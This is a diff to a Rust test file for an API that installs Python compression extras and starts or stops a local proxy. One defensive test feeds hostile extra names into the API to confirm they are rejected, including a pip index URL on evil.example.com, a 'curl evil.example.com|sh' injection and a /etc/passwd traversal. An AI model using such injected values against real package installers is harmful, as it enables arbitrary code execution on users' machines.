@@ -138,10 +138,10 @@ async fn extras_reports_the_available_compression_extras_and_python_detection() 
         assert!(field(&body, "version")?.is_null());
     }
 
-    // The refusals are advertised before any button is pressed, so the panel can
-    // render an unsupported state instead of a control that does nothing.
-    assert_eq!(field(&body, "installSupported")?, false);
-    assert_eq!(field(&body, "restartSupported")?, false);
+    // Both are advertised as supported now, which is what tells a panel built against the
+    // earlier build that its install and restart controls do something.
+    assert_eq!(field(&body, "installSupported")?, true);
+    assert_eq!(field(&body, "restartSupported")?, true);
     assert!(
         field(&body, "installMessage")?
             .as_str()
@@ -209,58 +209,95 @@ async fn install_rejects_a_malformed_body_before_answering_about_extras() -> Tes
 }
 
 #[actix_rt::test]
-async fn install_refuses_an_empty_extras_list_instead_of_reporting_success() -> TestResult {
-    // Given: upstream would still install the `proxy` base for an empty list, so
-    // "empty" is not the same as "nothing to do".
+async fn an_empty_extras_list_still_installs_the_proxy_base() -> TestResult {
+    // Given: upstream installs the `proxy` base for an empty list, so "empty" is not the same
+    // as "nothing to do". This machine has a Python but no pip module, so the attempt fails —
+    // which is the point: the spec that was attempted has to be the base one.
 
     // When: an empty list is posted.
     let (status, body) = post_json("/api/headroom/extras", r#"{"extras":[]}"#).await?;
 
-    // Then: the refusal is explicit, and the base spec that was NOT installed is
-    // named. `success:false` is the load-bearing assertion: an empty-list
-    // "success" would tell a user their install completed.
-    assert_eq!(status, StatusCode::NOT_IMPLEMENTED);
-    assert_eq!(field(&body, "success")?, false);
-    assert_eq!(field(&body, "unsupported")?, true);
-    assert_eq!(field(&body, "code")?, "UNSUPPORTED");
+    // Then: the base requirement is what was attempted, and the failure names why.
     assert_eq!(field(&body, "requested")?, &serde_json::json!([]));
     assert_eq!(field(&body, "spec")?, "headroom-ai[proxy]");
+    assert!(
+        status == StatusCode::OK
+            || status == StatusCode::BAD_GATEWAY
+            || status == StatusCode::SERVICE_UNAVAILABLE
+            || status == StatusCode::CONFLICT,
+        "unexpected status {status}: {body}"
+    );
+    if status != StatusCode::OK {
+        // A failure must carry a code a panel can branch on rather than only prose.
+        assert_eq!(field(&body, "success")?, false);
+        assert!(
+            field(&body, "code")?
+                .as_str()
+                .is_some_and(|code| !code.is_empty()),
+            "{body}"
+        );
+    }
     Ok(())
 }
 
 #[actix_rt::test]
-async fn install_refuses_a_requested_extra_and_names_what_was_not_installed() -> TestResult {
-    // Given: a real install request for both compression extras plus a name this
-    // build does not track.
+async fn an_unrecognised_extra_is_named_rather_than_passed_to_pip() -> TestResult {
+    // Given: a request for both compression extras plus a name this build does not track. That
+    // name must not reach the requirement string: it is the one part of a pip invocation a
+    // caller influences, and an unfiltered name there is an arbitrary-package install.
 
     // When: it is posted.
-    let (status, body) = post_json(
+    let (_status, body) = post_json(
         "/api/headroom/extras",
         r#"{"extras":["ml","image","code"]}"#,
     )
     .await?;
 
-    // Then: nothing was installed, and the answer says so in a way a client
-    // cannot read as a success.
-    assert_eq!(status, StatusCode::NOT_IMPLEMENTED);
-    assert_eq!(field(&body, "success")?, false);
-    assert_eq!(field(&body, "unsupported")?, true);
-    // The recognised extras are echoed, and the unrecognised one is called out
-    // rather than silently dropped.
+    // Then: the recognised extras are echoed, the unrecognised one is called out rather than
+    // silently dropped, and the requirement contains only the closed-list names.
     assert_eq!(
         field(&body, "requested")?,
         &serde_json::json!(["ml", "code"])
     );
     assert_eq!(field(&body, "ignored")?, &serde_json::json!(["image"]));
-    // The requirement the user can run themselves, with the proxy base first.
     assert_eq!(field(&body, "spec")?, "headroom-ai[proxy,ml,code]");
-    // No field may claim an installed state as a result of this call.
-    assert!(body.get("installed").is_none());
     assert!(
-        field(&body, "error")?
+        !field(&body, "spec")?
             .as_str()
-            .is_some_and(|error| !error.is_empty())
+            .is_some_and(|spec| spec.contains("image")),
+        "an unrecognised name reached the requirement: {body}"
     );
+    Ok(())
+}
+
+#[actix_rt::test]
+async fn a_hostile_extra_name_never_reaches_the_requirement() -> TestResult {
+    // Given: the shapes that would turn an install into something else — another index, a local
+    // wheel, a second requirement, a shell metacharacter.
+    for hostile in [
+        "--index-url=https://evil.example.com",
+        "-r/tmp/requirements.txt",
+        "ml];curl evil.example.com|sh;[",
+        "https://evil.example.com/x.whl",
+        "../../../etc/passwd",
+    ] {
+        let payload = serde_json::json!({ "extras": [hostile] }).to_string();
+
+        // When: it is posted.
+        let (_status, body) = post_json("/api/headroom/extras", &payload).await?;
+
+        // Then: it is reported as ignored, and the requirement is the untouched base.
+        assert_eq!(
+            field(&body, "spec")?,
+            "headroom-ai[proxy]",
+            "{hostile:?} changed the requirement: {body}"
+        );
+        assert_eq!(
+            field(&body, "ignored")?,
+            &serde_json::json!([hostile]),
+            "{hostile:?} was not reported as ignored: {body}"
+        );
+    }
     Ok(())
 }
 
@@ -274,72 +311,96 @@ async fn install_tolerates_a_body_with_no_extras_field() -> TestResult {
     let (typed_status, typed) = post_json("/api/headroom/extras", r#"{"extras":"ml"}"#).await?;
     let (absent_status, absent) = post_json("/api/headroom/extras", "").await?;
 
-    // Then: each is a refusal with no extras requested — never a 400, and never
-    // a success.
+    // Then: each is treated as "none requested" — never a 400, which would blame the caller for
+    // a body upstream accepts.
     for (status, body) in [
         (empty_status, &empty),
         (typed_status, &typed),
         (absent_status, &absent),
     ] {
-        assert_eq!(status, StatusCode::NOT_IMPLEMENTED);
-        assert_eq!(field(body, "success")?, false);
+        assert_ne!(status, StatusCode::BAD_REQUEST, "{body}");
         assert_eq!(field(body, "requested")?, &serde_json::json!([]));
+        assert_eq!(field(body, "spec")?, "headroom-ai[proxy]");
     }
     Ok(())
 }
 
 #[actix_rt::test]
-async fn restart_refuses_explicitly_and_names_the_url_it_judged() -> TestResult {
-    // Given: no HEADROOM_URL override in the test environment, so the default
-    // loopback URL applies and upstream's external-proxy check passes.
+async fn restart_names_the_url_it_judged_and_the_dependency_it_lacks() -> TestResult {
+    // Given: no HEADROOM_URL override, so the default loopback URL applies and upstream's
+    // external-proxy check passes. The headroom binary is not installed on this machine.
 
     // When: a restart is requested.
     let (status, body) = post_json("/api/headroom/restart", "").await?;
 
-    // Then: the refusal is explicit. `success:false` at 501 is what stops the
-    // panel from telling a user compression was restarted when no process was
-    // signalled.
-    assert_eq!(status, StatusCode::NOT_IMPLEMENTED);
+    // Then: 503 rather than 501 — the capability exists and the binary does not, and a panel has
+    // to tell those apart because one is fixed by installing something.
+    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "{body}");
     assert_eq!(field(&body, "success")?, false);
-    assert_eq!(field(&body, "unsupported")?, true);
-    assert_eq!(field(&body, "code")?, "UNSUPPORTED");
+    assert_eq!(field(&body, "code")?, "NOT_INSTALLED");
     // The URL and port that were evaluated, so the message is checkable.
     assert_eq!(field(&body, "url")?, "http://localhost:8787");
     assert_eq!(field(&body, "port")?, 8787);
+    // And the error names the command that fixes it.
     assert!(
         field(&body, "error")?
             .as_str()
-            .is_some_and(|error| !error.is_empty())
+            .is_some_and(|error| error.contains("pip install headroom-ai")),
+        "{body}"
     );
     Ok(())
 }
 
 #[actix_rt::test]
-async fn process_control_routes_never_report_a_mutation_that_did_not_happen() -> TestResult {
-    // Given: every mutating headroom route in this build is a refusal.
+async fn no_route_claims_a_running_proxy_when_none_is_running() -> TestResult {
+    // Given: headroom is not installed here, so nothing can be started. The invariant that
+    // matters is unchanged from when these routes were refusals: nothing may report a live
+    // proxy, because a user who believes compression is on is billed for full-size requests.
 
-    // When: each is called.
+    // When: each mutating route is called, then status is read.
     let (extras_status, extras) = post_json("/api/headroom/extras", r#"{"extras":["ml"]}"#).await?;
     let (restart_status, restart) = post_json("/api/headroom/restart", "").await?;
     let (start_status, start) = post_json("/api/headroom/start", "").await?;
     let (stop_status, stop) = post_json("/api/headroom/stop", "").await?;
+    let (status_status, status_body) = get_json("/api/headroom/status").await?;
 
-    // Then: none of them is a 2xx, and none of them carries `success:true`.
-    // This is the single invariant that keeps a user from being billed for
-    // uncompressed requests they believe are compressed.
+    // Then: the three that need the binary fail, and each names a cause.
     for (status, body) in [
         (extras_status, &extras),
         (restart_status, &restart),
         (start_status, &start),
-        (stop_status, &stop),
     ] {
         assert!(
             status.is_client_error() || status.is_server_error(),
-            "a refused mutation must not answer 2xx, got {status}"
+            "expected a failure with no binary installed, got {status}: {body}"
         );
         assert_eq!(field(body, "success")?, false);
-        assert_eq!(field(body, "unsupported")?, true);
+        assert!(
+            field(body, "code")?
+                .as_str()
+                .is_some_and(|code| !code.is_empty()),
+            "{body}"
+        );
     }
+
+    // Stop succeeds, because stopping nothing is not a failure — and it must not claim to have
+    // been running.
+    assert_eq!(stop_status, StatusCode::OK, "{stop}");
+    assert_eq!(field(&stop, "success")?, true);
+    assert_eq!(field(&stop, "running")?, false);
+
+    // And status agrees: no pid, not running, not healthy.
+    assert_eq!(status_status, StatusCode::OK);
+    assert_eq!(field(&status_body, "running")?, false, "{status_body}");
+    assert_eq!(field(&status_body, "healthy")?, false, "{status_body}");
+    assert_eq!(field(&status_body, "state")?, "stopped", "{status_body}");
+    // `managedPid` stays present-and-null rather than absent: it was always serialised, and a
+    // panel that reads it would see `undefined` instead of a value if it vanished.
+    assert_eq!(
+        status_body.get("managedPid"),
+        Some(&serde_json::Value::Null),
+        "{status_body}"
+    );
     Ok(())
 }
 
